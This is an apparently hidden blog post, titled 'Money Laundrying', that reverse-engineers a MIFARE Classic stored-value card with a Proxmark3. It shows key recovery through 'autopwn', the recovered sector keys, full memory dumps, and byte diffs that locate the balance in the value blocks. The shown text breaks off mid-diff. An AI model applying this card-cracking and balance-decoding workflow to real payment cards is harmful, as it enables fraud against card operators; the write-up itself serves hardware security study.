---
layout: post
title: Money Laundrying
date: 2025-10-12
categories: security
tags: rfid mifare-classic proxmark3 reverse-engineering
hidden: true
sitemap: false
---

## Intro

It started with a stored-value card and a very simple question: if the official reader can update the balance, what is stopping me from talking to the same card and writing the same kind of bytes?

So I tried to understand how it worked. The plan was simple: read the card, spend a little, read it again, and compare the two dumps until the balance fell out. This is that little investigation, with just enough MIFARE Classic context to make the block reads, writes, and diffs make sense.

## Card discovery

The first step was simply asking the Proxmark what kind of tag was in front of it. The important parts here are the UID, the detected card family, and the weak PRNG hint, which usually means the card is a good candidate for the standard MIFARE Classic tooling.

```sh
[usb] pm3 --> hf search
 🕖  Searching for ISO14443-A tag...
[=] ---------- ISO14443-A Information ----------
[+]  UID: 6C 2F AC 83   ( ONUID, re-used )
[+] ATQA: 00 02
[+]  SAK: 18 [2]
[+] Possible types:
[+]    MIFARE Classic 4K
[=]
[=] Proprietary non iso14443-4 card found
[=] RATS not supported
[+] Prng detection..... weak

[?] Hint: Try `hf mf info`


[+] Valid ISO 14443-A tag found
```

## MIFARE Classic layout

Before looking at the dump, it helps to keep the MIFARE Classic memory layout in mind (for the full details, refer to the [NPX](https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf) specs). The card is split into sectors, each sector is split into blocks, and every block is 16 bytes. The keys are not attached to a single block: they belong to a whole sector.

For the dump below, the useful mental model is the MIFARE Classic 1K-style layout:

```text
sector  global blocks  sector-local blocks  notes
------  -------------  -------------------  -----------------------------------------
0       0-3            0-3                  block 0 is the manufacturer block
1       4-7            0-3                  blocks 4-6 are data, block 7 is trailer
2       8-11           0-3                  blocks 8-10 are data, block 11 is trailer
...     ...            ...                  same pattern
15      60-63          0-3                  blocks 60-62 are data, block 63 is trailer
```

MIFARE Classic 4K cards extend this layout with more sectors. The first 32 sectors still have 4 blocks each; the larger sectors after that have 16 blocks each, with the last block of each sector still acting as the trailer. The dump I am looking at here only shows the first 16 sectors, so the simple 4-block-per-sector model is enough for the rest of this post.

So when the dump says `sec 2 | blk 8`, it means global block `8`, which is block `0` inside sector `2`. The last block of the sector is the sector trailer. For sector `2`, that is block `11`.

The sector trailer is special:

```text
bytes 0..5    key A
bytes 6..8    access bits
byte  9       general purpose byte
bytes 10..15  key B
```

The access bits define what key is needed to read or write each block in that sector. In the common simple case, key A can read data blocks and key B can write them, while the trailer itself controls the keys and permissions. That is why the key table printed by `autopwn` shows one key A and one key B per sector trailer block:

```text
Sec 2, trailer block 11:
key A = A49F68AB4733
key B = B4E109EC9C52
```

Those are the keys for the whole sector, not just block `11`. So for this card, any access to blocks `8`, `9`, and `10` depends on the sector `2` keys and the permissions encoded in the sector trailer.

In practice, the key choice comes from the trailer's access bits:

```text
operation                  which key?
-------------------------  ----------------------------------------------------------
read a data block          whichever of key A or key B the access bits allow
write a data block         whichever of key A or key B the access bits allow
change sector permissions  authenticate to the trailer with a key allowed to write it
change key A or key B      write the sector trailer, not the data blocks
```

As a rule of thumb: data lives in the data blocks, permissions and keys live in the trailer. Trailer blocks can be rewritten like any other block, as long as the current access bits allow it. The catch is that once a trailer is overwritten, the new keys and access bits immediately define what can be read or written next, so a bad trailer write can lock you out of the sector with the keys you have.

With that layout in mind, `hf mf info` gives a compact summary of the card and checks whether any obvious default keys work. In this case, sector 0 is readable with the default `FFFFFFFFFFFF` key, which is enough to get started.

```sh
[usb] pm3 --> hf mf info

[=] --- ISO14443-a Information -----------------------------
[+]  UID: 6C 2F AC 83
[+] ATQA: 00 02
[+]  SAK: 18 [1]

[=] --- Keys Information
[+] loaded 2 user keys
[+] loaded 61 hardcoded keys
[+] Sector 0 key A... FFFFFFFFFFFF
[+] Sector 0 key B... FFFFFFFFFFFF
[+] Backdoor key..... same as key A/B
[+] Block 0.......... 6C2FAC836C980200E08E3D1955102213 | .=.U.\".

[=] --- Fingerprint
[+] n/a

[=] --- Magic Tag Information
[=] <n/a>

[=] --- PRNG Information
[+] Prng....... weak
```

Before touching the card, I took note of the visible balance. This first snapshot is the baseline I want to recover from the binary dump.

{% include figure.html path="assets/img/blog/2025-10-12/1250.png" class="img-fluid centered" zoomable=true caption="Initial credit value: 12.50" %}

The next step was to recover enough sector keys to read the full memory. `autopwn` tries the usual MIFARE Classic attacks and dictionaries, then prints a useful table: one row per sector trailer, with the recovered key A and key B for that sector. It also dumps the card at the end, so this gives me the first binary snapshot of the card at `12.50`.

```sh
[usb] pm3 --> hf mf autopwn

[!] ⚠️   Known key failed. Can\'t authenticate to block   0 key type A
[!] ⚠️   No known key was supplied, key recovery might fail
[+] loaded 5 user keys
[+] loaded 61 hardcoded keys
[=] Running strategy 1
[=] Running strategy 2
[=] .
[+] Target sector   0 key type A -- found valid key [ FFFFFFFFFFFF ] (used for nested / hardnested attack)
[+] Target sector   0 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   3 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   3 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   4 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   4 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   5 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   5 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   6 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   6 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   7 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   7 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   8 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   8 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   9 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector   9 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  10 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  10 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  11 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  11 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  12 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  12 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  13 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  13 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  14 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  14 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  15 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] Target sector  15 key type B -- found valid key [ FFFFFFFFFFFF ]

[+] Found 1 key candidate
[+] Target block    4 key type A -- found valid key [ A71A0C3102FD ]
[+] Target sector   1 key type A -- found valid key [ A71A0C3102FD ]

[+] Found 1 key candidate
[+] Target block    4 key type B -- found valid key [ B76198135BD9 ]
[+] Target sector   1 key type B -- found valid key [ B76198135BD9 ]

[+] Found 1 key candidate
[+] Target block    8 key type A -- found valid key [ A49F68AB4733 ]
[+] Target sector   2 key type A -- found valid key [ A49F68AB4733 ]

[+] Target block    8 key type B
[-] ⛔ Nested attack failed, trying again (1/6)
[+] Found 1 key candidate
[+] Target block    8 key type B -- found valid key [ B4E109EC9C52 ]
[+] Target sector   2 key type B -- found valid key [ B4E109EC9C52 ]

[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  001 | 007 | A71A0C3102FD | N | B76198135BD9 | N
[+]  002 | 011 | A49F68AB4733 | N | B4E109EC9C52 | N
[+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  005 | 023 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  006 | 027 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  007 | 031 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+] -----+-----+--------------+---+--------------+----
[=] ( D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  )


[+] Generating binary key file
[+] Found keys have been dumped to `~/hf-mf-6C2FAC83-key.bin`
[=] --[ FFFFFFFFFFFF ]-- has been inserted for unknown keys where res is 0
[=] Transferring keys to simulator memory ( ok )
[=] Dumping card content to emulator memory (Cmd Error: 04 can occur)
[=] downloading card content from emulator memory
[+] Saved 1024 bytes to binary file `~/hf-mf-6C2FAC83-dump.bin`
[+] Saved to json file ~/hf-mf-6C2FAC83-dump.json
[=] Autopwn execution time: 9 seconds
```

Then I used the card normally and spent some credit. The visible balance moved from `12.50` to `9.00`, which gives me a clean before/after pair to compare.

{% include figure.html path="assets/img/blog/2025-10-12/0900.png" class="img-fluid centered" zoomable=true caption="Credit value after payment: 9.00" %}

After spending, I dumped the card again with the keys recovered by `autopwn`. This is the second data snapshot: each row is a 16-byte block, with the sector number on the left and the global block number next to it.

```sh

[usb] pm3 --> hf mf dump
[+] Loaded binary key file `~/hf-mf-6C2FAC83-key.bin`
[=] Reading sector access bits...
[=] .................
[+] Finished reading sector access bits
[=] Dumping all blocks from card...
 🕙 Sector... 15 block... 3 ( ok )
[+] Succeeded in dumping all blocks

[+] time: 11 seconds


[=] -----+-----+-------------------------------------------------+-----------------
[=]  sec | blk | data                                            | ascii
[=] -----+-----+-------------------------------------------------+-----------------
[=]    0 |   0 | 6C 2F AC 83 6C 98 02 00 E0 8E 3D 19 55 10 22 13 | l/..l.....=.U.\".
[=]      |   1 | 7B 00 26 88 26 88 00 00 00 00 00 00 00 00 00 00 | {.&.&...........
[=]      |   2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |   3 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    1 |   4 | 00 00 71 01 00 00 01 01 03 01 00 00 00 00 00 4E | ..q............N
[=]      |   5 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0B | ................
[=]      |   6 | 92 B3 D9 34 00 00 00 00 00 00 00 00 FB 01 00 16 | .4...........
[=]      |   7 | A7 1A 0C 31 02 FD 78 77 88 00 B7 61 98 13 5B D9 | ...1..xw...a..[.
[=]    2 |   8 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....{........
[=]      |   9 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....{........
[=]      |  10 | 00 00 00 00 FF FF FF FF 00 00 00 00 0A F5 0A F5 | ..............
[=]      |  11 | A4 9F 68 AB 47 33 08 77 8F 00 B4 E1 09 EC 9C 52 | ..h.G3.w.......R
[=]    3 |  12 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  13 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  14 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  15 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    4 |  16 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  17 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  18 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  19 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    5 |  20 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  21 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  22 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  23 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    6 |  24 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  25 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  26 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  27 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    7 |  28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  29 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  30 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  31 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    8 |  32 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  33 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  34 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  35 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]    9 |  36 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  37 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  38 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  39 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   10 |  40 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  41 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  42 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  43 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   11 |  44 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  45 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  46 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  47 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   12 |  48 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  49 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  50 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  51 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   13 |  52 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  53 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  54 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  55 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   14 |  56 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  57 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  58 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  59 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=]   15 |  60 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  61 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  62 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
[=]      |  63 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
[=] -----+-----+-------------------------------------------------+-----------------

[+] Saved 1024 bytes to binary file `~/hf-mf-6C2FAC83-dump-001.bin`
[+] Saved to json file ~/hf-mf-6C2FAC83-dump-001.json
```

At this point I had two dumps from the same card at two different balances: one from `autopwn` at `12.50`, and one after spending at `9.00`. The easiest way to find the stored value is to compare them and look for blocks that change in a way that matches the visible balance.

This is the point where the problem becomes relational. A value does not mean much in isolation; it starts to mean something when it changes, or when it is contrasted with another value. Bateson's definition of information as ["a difference that makes a difference"](https://www.goodreads.com/quotes/517599-information-is-a-difference-that-makes-a-difference) fits perfectly here: one dump is just noise, but two dumps, with one known thing changed, start to point at structure.

I used [`ssdp`](https://github.com/fedemengo/ssdp), a small helper tool I wrote, to diff the binary dumps. The diff groups each 16-byte block into units. With `--units 1`, every single byte is its own unit, so the output can point to the exact changed byte instead of a larger 2-, 4-, or 8-byte chunk. That makes the output look like a block view with per-byte offsets, so a change at `+05` means byte `5` inside that block was modified.

```sh
> ssdp diff --units 1 --format mf1k hf-mf-6C2FAC83-dump-0900.bin hf-mf-6C2FAC83-dump-1250.bin | cat
Inputs:
  data01: hf-mf-6C2FAC83-dump-0900.bin
  data02: hf-mf-6C2FAC83-dump-1250.bin

Diff blocks:
  [BLOCK] ID=6 S=1 B=2
  [BLOCK] ID=8 S=2 B=0
  [BLOCK] ID=9 S=2 B=1

[BLOCK] ID=6 S=1 B=2
  [units=1]
    data01: FULL=[92] | [B3] | [D9] | 34 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | [FB] | 01 | 00 | [16]
    data02: FULL=[C5] | [59] | [C6] | 34 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | [F9] | 01 | 00 | [04]
    !+00
      data01: RAW=92 | INT_LE=       146 | INT_BE=       146 | NOT_LE=       109 | NOT_BE=       109 | BIN=10010010 | BIN_NOT=01101101 | NOT_RAW=6D
      data02: RAW=C5 | INT_LE=       197 | INT_BE=       197 | NOT_LE=        58 | NOT_BE=        58 | BIN=11000101 | BIN_NOT=00111010 | NOT_RAW=3A
    !+01
      data01: RAW=B3 | INT_LE=       179 | INT_BE=       179 | NOT_LE=        76 | NOT_BE=        76 | BIN=10110011 | BIN_NOT=01001100 | NOT_RAW=4C
      data02: RAW=59 | INT_LE=        89 | INT_BE=        89 | NOT_LE=       166 | NOT_BE=       166 | BIN=01011001 | BIN_NOT=10100110 | NOT_RAW=A6
    !+02
      data01: RAW=D9 | INT_LE=       217 | INT_BE=       217 | NOT_LE=        38 | NOT_BE=        38 | BIN=11011001 | BIN_NOT=00100110 | NOT_RAW=26
      data02: RAW=C6 | INT_LE=       198 | INT_BE=       198 | NOT_LE=        57 | NOT_BE=        57 | BIN=11000110 | BIN_NOT=00111001 | NOT_RAW=39
    !+12
      data01: RAW=FB | INT_LE=       251 | INT_BE=       251 | NOT_LE=         4 | NOT_BE=         4 | BIN=11111011 | BIN_NOT=00000100 | NOT_RAW=04
      data02: RAW=F9 | INT_LE=       249 | INT_BE=       249 | NOT_LE=         6 | NOT_BE=         6 | BIN=11111001 | BIN_NOT=00000110 | NOT_RAW=06
    !+15
      data01: RAW=16 | INT_LE=        22 | INT_BE=        22 | NOT_LE=       233 | NOT_BE=       233 | BIN=00010110 | BIN_NOT=11101001 | NOT_RAW=E9
      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB

[BLOCK] ID=8 S=2 B=0
  [units=1]
    data01: FULL=[84] | [03] | 00 | 00 | [7B] | [FC] | FF | FF | [84] | [03] | 00 | 00 | 09 | F6 | 09 | F6
    data02: FULL=[E2] | [04] | 00 | 00 | [1D] | [FB] | FF | FF | [E2] | [04] | 00 | 00 | 09 | F6 | 09 | F6
    !+00
      data01: RAW=84 | INT_LE=       132 | INT_BE=       132 | NOT_LE=       123 | NOT_BE=       123 | BIN=10000100 | BIN_NOT=01111011 | NOT_RAW=7B
      data02: RAW=E2 | INT_LE=       226 | INT_BE=       226 | NOT_LE=        29 | NOT_BE=        29 | BIN=11100010 | BIN_NOT=00011101 | NOT_RAW=1D
    !+01
      data01: RAW=03 | INT_LE=         3 | INT_BE=         3 | NOT_LE=       252 | NOT_BE=       252 | BIN=00000011 | BIN_NOT=11111100 | NOT_RAW=FC
      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB
    !+04
      data01: RAW=7B | INT_LE=       123 | INT_BE=       123 | NOT_LE=       132 | NOT_BE=       132 | BIN=01111011 | BIN_NOT=10000100 | NOT_RAW=84
      data02: RAW=1D | INT_LE=        29 | INT_BE=        29 | NOT_LE=       226 | NOT_BE=       226 | BIN=00011101 | BIN_NOT=11100010 | NOT_RAW=E2
    !+05
      data01: RAW=FC | INT_LE=       252 | INT_BE=       252 | NOT_LE=         3 | NOT_BE=         3 | BIN=11111100 | BIN_NOT=00000011 | NOT_RAW=03
      data02: RAW=FB | INT_LE=       251 | INT_BE=       251 | NOT_LE=         4 | NOT_BE=         4 | BIN=11111011 | BIN_NOT=00000100 | NOT_RAW=04
    !+08
      data01: RAW=84 | INT_LE=       132 | INT_BE=       132 | NOT_LE=       123 | NOT_BE=       123 | BIN=10000100 | BIN_NOT=01111011 | NOT_RAW=7B
      data02: RAW=E2 | INT_LE=       226 | INT_BE=       226 | NOT_LE=        29 | NOT_BE=        29 | BIN=11100010 | BIN_NOT=00011101 | NOT_RAW=1D
    !+09
      data01: RAW=03 | INT_LE=         3 | INT_BE=         3 | NOT_LE=       252 | NOT_BE=       252 | BIN=00000011 | BIN_NOT=11111100 | NOT_RAW=FC
      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB

[BLOCK] ID=9 S=2 B=1
  [units=1]
    data01: FULL=[84] | [03] | 00 | 00 | [7B] | [FC] | FF | FF | [84] | [03] | 00 | 00 | 09 | F6 | 09 | F6
    data02: FULL=[E2] | [04] | 00 | 00 | [1D] | [FB] | FF | FF | [E2] | [04] | 00 | 00 | 09 | F6 | 09 | F6
    !+00
      data01: RAW=84 | INT_LE=       132 | INT_BE=       132 | NOT_LE=       123 | NOT_BE=       123 | BIN=10000100 | BIN_NOT=01111011 | NOT_RAW=7B
      data02: RAW=E2 | INT_LE=       226 | INT_BE=       226 | NOT_LE=        29 | NOT_BE=        29 | BIN=11100010 | BIN_NOT=00011101 | NOT_RAW=1D
    !+01
      data01: RAW=03 | INT_LE=         3 | INT_BE=         3 | NOT_LE=       252 | NOT_BE=       252 | BIN=00000011 | BIN_NOT=11111100 | NOT_RAW=FC
      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB
    !+04
      data01: RAW=7B | INT_LE=       123 | INT_BE=       123 | NOT_LE=       132 | NOT_BE=       132 | BIN=01111011 | BIN_NOT=10000100 | NOT_RAW=84
      data02: RAW=1D | INT_LE=        29 | INT_BE=        29 | NOT_LE=       226 | NOT_BE=       226 | BIN=00011101 | BIN_NOT=11100010 | NOT_RAW=E2
    !+05
      data01: RAW=FC | INT_LE=       252 | INT_BE=       252 | NOT_LE=         3 | NOT_BE=         3 | BIN=11111100 | BIN_NOT=00000011 | NOT_RAW=03
      data02: RAW=FB | INT_LE=       251 | INT_BE=       251 | NOT_LE=         4 | NOT_BE=         4 | BIN=11111011 | BIN_NOT=00000100 | NOT_RAW=04
    !+08
      data01: RAW=84 | INT_LE=       132 | INT_BE=       132 | NOT_LE=       123 | NOT_BE=       123 | BIN=10000100 | BIN_NOT=01111011 | NOT_RAW=7B
      data02: RAW=E2 | INT_LE=       226 | INT_BE=       226 | NOT_LE=        29 | NOT_BE=        29 | BIN=11100010 | BIN_NOT=00011101 | NOT_RAW=1D
    !+09
      data01: RAW=03 | INT_LE=         3 | INT_BE=         3 | NOT_LE=       252 | NOT_BE=       252 | BIN=00000011 | BIN_NOT=11111100 | NOT_RAW=FC
      data02: RAW=04 | INT_LE=         4 | INT_BE=         4 | NOT_LE=       251 | NOT_BE=       251 | BIN=00000100 | BIN_NOT=11111011 | NOT_RAW=FB

```

This is useful, but it is also noisy. The interesting changes tend to come in adjacent byte pairs, so it makes sense to run the same comparison again with `--units 2`. That gives a better view of 16-bit values, which is exactly the kind of encoding I would expect for a small balance.

```sh
> ssdp diff --units 2 --format mf1k hf-mf-6C2FAC83-dump-0900.bin hf-mf-6C2FAC83-dump-1250.bin | cat
Inputs:
  data01: hf-mf-6C2FAC83-dump-0900.bin
  data02: hf-mf-6C2FAC83-dump-1250.bin

Diff blocks:
  [BLOCK] ID=6 S=1 B=2
  [BLOCK] ID=8 S=2 B=0
  [BLOCK] ID=9 S=2 B=1

[BLOCK] ID=6 S=1 B=2
  [units=2]
    data01: FULL=[92 B3] | [D9 34] | 00 00 | 00 00 | 00 00 | 00 00 | [FB 01] | [00 16]
    data02: FULL=[C5 59] | [C6 34] | 00 00 | 00 00 | 00 00 | 00 00 | [F9 01] | [00 04]
    !+00
      data01: RAW=92 B3 | INT_LE=     45970 | INT_BE=     37555 | NOT_LE=     19565 | NOT_BE=     27980 | BIN=1011001110010010 | BIN_NOT=0100110001101101 | NOT_RAW=6D 4C
      data02: RAW=C5 59 | INT_LE=     22981 | INT_BE=     50521 | NOT_LE=     42554 | NOT_BE=     15014 | BIN=0101100111000101 | BIN_NOT=1010011000111010 | NOT_RAW=3A A6
    !+02
      data01: RAW=D9 34 | INT_LE=     13529 | INT_BE=     55604 | NOT_LE=     52006 | NOT_BE=      9931 | BIN=0011010011011001 | BIN_NOT=1100101100100110 | NOT_RAW=26 CB
      data02: RAW=C6 34 | INT_LE=     13510 | INT_BE=     50740 | NOT_LE=     52025 | NOT_BE=     14795 | BIN=0011010011000110 | BIN_NOT=1100101100111001 | NOT_RAW=39 CB
    !+12
      data01: RAW=FB 01 | INT_LE=       507 | INT_BE=     64257 | NOT_LE=     65028 | NOT_BE=      1278 | BIN=0000000111111011 | BIN_NOT=1111111000000100 | NOT_RAW=04 FE
      data02: RAW=F9 01 | INT_LE=       505 | INT_BE=     63745 | NOT_LE=     65030 | NOT_BE=      1790 | BIN=0000000111111001 | BIN_NOT=1111111000000110 | NOT_RAW=06 FE
    !+14
      data01: RAW=00 16 | INT_LE=      5632 | INT_BE=        22 | NOT_LE=     59903 | NOT_BE=     65513 | BIN=0001011000000000 | BIN_NOT=1110100111111111 | NOT_RAW=FF E9
      data02: RAW=00 04 | INT_LE=      1024 | INT_BE=         4 | NOT_LE=     64511 | NOT_BE=     65531 | BIN=0000010000000000 | BIN_NOT=1111101111111111 | NOT_RAW=FF FB

[BLOCK] ID=8 S=2 B=0
  [units=2]
    data01: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
    data02: FULL=[E2 04] | 00 00 | [1D FB] | FF FF | [E2 04] | 00 00 | 09 F6 | 09 F6
    !+00
      data01: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
      data02: RAW=E2 04 | INT_LE=      1250 | INT_BE=     57860 | NOT_LE=     64285 | NOT_BE=      7675 | BIN=0000010011100010 | BIN_NOT=1111101100011101 | NOT_RAW=1D FB
    !+04
      data01: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
      data02: RAW=1D FB | INT_LE=     64285 | INT_BE=      7675 | NOT_LE=      1250 | NOT_BE=     57860 | BIN=1111101100011101 | BIN_NOT=0000010011100010 | NOT_RAW=E2 04
    !+08
      data01: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
      data02: RAW=E2 04 | INT_LE=      1250 | INT_BE=     57860 | NOT_LE=     64285 | NOT_BE=      7675 | BIN=0000010011100010 | BIN_NOT=1111101100011101 | NOT_RAW=1D FB

[BLOCK] ID=9 S=2 B=1
  [units=2]
    data01: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
    data02: FULL=[E2 04] | 00 00 | [1D FB] | FF FF | [E2 04] | 00 00 | 09 F6 | 09 F6
    !+00
      data01: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
      data02: RAW=E2 04 | INT_LE=      1250 | INT_BE=     57860 | NOT_LE=     64285 | NOT_BE=      7675 | BIN=0000010011100010 | BIN_NOT=1111101100011101 | NOT_RAW=1D FB
    !+04
      data01: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
